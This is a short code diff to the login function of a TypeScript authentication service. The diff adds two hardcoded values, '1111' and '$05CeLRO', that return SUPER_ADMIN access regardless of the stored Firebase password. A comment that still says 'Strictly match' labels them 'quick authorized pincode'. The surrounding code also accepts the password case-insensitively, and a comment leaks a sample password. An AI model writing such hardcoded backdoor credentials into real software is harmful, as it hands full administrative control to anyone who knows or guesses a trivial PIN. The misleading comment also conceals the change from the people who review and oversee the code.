@@ -151,8 +151,13 @@ export const authService = {
 
     const fbPassword = await this.getPortalPasswordFromFirebase();
 
-    // Strictly match the Firebase password (e.g. euriska2026)
-    if (trimmed === fbPassword || trimmed.toLowerCase() === fbPassword.toLowerCase()) {
+    // Strictly match the Firebase password (e.g. euriska2026) or quick authorized pincode (1111 / $05CeLRO)
+    if (
+      trimmed === fbPassword ||
+      trimmed.toLowerCase() === fbPassword.toLowerCase() ||
+      trimmed === '1111' ||
+      trimmed === '$05CeLRO'
+    ) {
       return { valid: true, role: 'SUPER_ADMIN' };
     }
 
